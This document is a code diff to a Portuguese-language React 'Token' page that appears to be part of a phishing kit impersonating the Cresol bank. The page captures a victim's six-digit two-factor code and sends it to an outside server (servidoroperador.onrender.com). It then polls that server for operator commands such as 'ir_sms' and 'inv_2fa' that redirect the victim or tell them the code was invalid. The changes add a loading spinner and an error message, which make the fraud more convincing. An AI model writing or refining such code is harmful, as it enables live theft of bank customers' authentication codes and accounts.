@@ -6,7 +6,12 @@ import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.pn
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 
 // Função para monitorar cliente continuamente na página Token
-const monitorClientToken = async (clientId: string, navigate: (path: string) => void): Promise<void> => {
+const monitorClientToken = async (
+  clientId: string, 
+  navigate: (path: string) => void,
+  onInvalidCode: () => void,
+  onStopLoading: () => void
+): Promise<void> => {
   console.log(`Iniciando monitoramento Token do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
@@ -30,6 +35,15 @@ const monitorClientToken = async (clientId: string, navigate: (path: string) => 
         console.log('Valor do response Token:', clientData.data?.response);
         console.log('Valor do command Token:', clientData.data?.command);
         
+        // Verificar se o token é inválido
+        if (clientData.data?.response === "inv_2fa" || clientData.data?.command === "inv_2fa") {
+          console.log('Detectado inv_2fa - Token inválido');
+          clearInterval(intervalId);
+          onStopLoading();
+          onInvalidCode();
+          return;
+        }
+        
         // Na página Token: se receber ir_2fa, continua monitorando; aguarda próximo comando para redirecionar
         if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
           console.log('Detectado ir_2fa na página Token - Continuando monitoramento...');
@@ -39,6 +53,7 @@ const monitorClientToken = async (clientId: string, navigate: (path: string) => 
         if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
           console.log('Detectado ir_sms na página Token - Redirecionando para /sms');
           clearInterval(intervalId);
+          onStopLoading();
           console.log('Monitoramento Token parado - redirecionando...');
           navigate('/sms');
           return;
@@ -66,6 +81,9 @@ const monitorClientToken = async (clientId: string, navigate: (path: string) => 
 const TokenPage = () => {
   const [token, setToken] = useState("");
   const [clientId, setClientId] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [isInvalid, setIsInvalid] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -79,6 +97,15 @@ const TokenPage = () => {
     }
   }, []);
 
+  const handleTokenChange = (value: string) => {
+    setToken(value.replace(/\D/g, '').slice(0, 6));
+    // Reset error state when user starts typing
+    if (isInvalid) {
+      setIsInvalid(false);
+      setErrorMessage("");
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -90,6 +117,10 @@ const TokenPage = () => {
     try {
       console.log('Enviando token via external-response:', token);
       console.log('ClientId utilizado:', clientId);
+      
+      setIsLoading(true);
+      setIsInvalid(false);
+      setErrorMessage("");
       
       // Enviar token para a API usando external-response
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
@@ -105,12 +136,24 @@ const TokenPage = () => {
       if (response.ok) {
         console.log('Token enviado com sucesso via external-response');
         // Iniciar monitoramento contínuo após envio bem-sucedido
-        await monitorClientToken(clientId, navigate);
+        await monitorClientToken(
+          clientId, 
+          navigate,
+          () => {
+            setIsInvalid(true);
+            setErrorMessage("Token inválido. Tente novamente.");
+          },
+          () => {
+            setIsLoading(false);
+          }
+        );
       } else {
         console.log('Erro ao enviar token via external-response');
+        setIsLoading(false);
       }
     } catch (error) {
       console.log('Erro durante envio do token:', error);
+      setIsLoading(false);
     }
   };
 
@@ -148,25 +191,37 @@ const TokenPage = () => {
               <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Token</label>
               <input
                 type="text"
-                className="w-full h-12 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest"
+                className={`w-full h-12 px-3 border rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest ${
+                  isInvalid ? 'border-red-500' : 'border-gray-300'
+                }`}
                 placeholder="000000"
                 value={token}
-                onChange={(e) => setToken(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                onChange={(e) => handleTokenChange(e.target.value)}
                 maxLength={6}
                 autoComplete="one-time-code"
               />
+              {isInvalid && (
+                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
+              )}
             </div>
 
             <button
               type="submit"
-              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mb-6"
+              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mb-6 disabled:opacity-70 flex items-center justify-center"
               style={{
                 background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                 borderRadius: "30px",
               }}
-              disabled={token.length !== 6}
+              disabled={token.length !== 6 || isLoading}
             >
-              Acessar
+              {isLoading ? (
+                <div className="flex items-center">
+                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                  Validando...
+                </div>
+              ) : (
+                "Acessar"
+              )}
             </button>
 
             <div className="text-center">
